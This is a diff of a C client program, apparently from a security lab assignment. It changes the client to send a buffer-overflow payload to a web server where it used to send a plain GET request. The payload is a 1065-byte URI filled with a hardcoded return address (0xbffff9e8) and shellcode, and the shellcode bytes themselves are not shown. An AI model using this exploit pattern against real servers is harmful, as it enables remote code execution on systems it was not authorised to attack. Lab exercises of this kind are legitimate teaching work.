@@ -63,21 +63,21 @@ int main(int argc, char *argv[])
 
   //code fill in it
 	char *req="GET / HTTP/1.1\r\n\r\n";
-  char uri[1041];//uri不能太大，否则会把是getToken的参数fd也覆盖掉，这样getchar就读不到fd程序在getchar内终止
+  char uri[1065];//uri不能太大，否则会把是getToken的参数fd也覆盖掉，这样getchar就读不到fd程序在getchar内终止
 	/*先把返回地址写到字符数组*/
-  int *addr_s;
+  long *addr_s;
   int i;
-  addr_s=(int *)uri;
-  for(i=0;i<260;i++)
+  addr_s=(long *)uri;
+  for(i=0;i<266;i++)
          addr_s[i]=0xbffff9e8;
-  for(i=4;i<strlen(shellcode);i++)
-           uri[i-4]=shellcode[i];
-     uri[1041]='\0';
+  for(i=0;i<strlen(shellcode);i++)
+           uri[i]=shellcode[i];
+     uri[1065]='\0';
     // uri[0]='G';
     // uri[1]='E';
     // uri[2]='T';
     // uri[3]=' ';
-    // uri[1040]=' ';
+     uri[1064]=' ';
  
  
  
@@ -87,7 +87,7 @@ int main(int argc, char *argv[])
     you should fix the code to realize your attack
   */  
  // char *req ="GET / HTTP/1.1\r\n\r\n";
-  write(sock_client,req,strlen(req));
+  write(sock_client,uri,strlen(uri));
   
   //receive the response from web server
   char resp[1024];
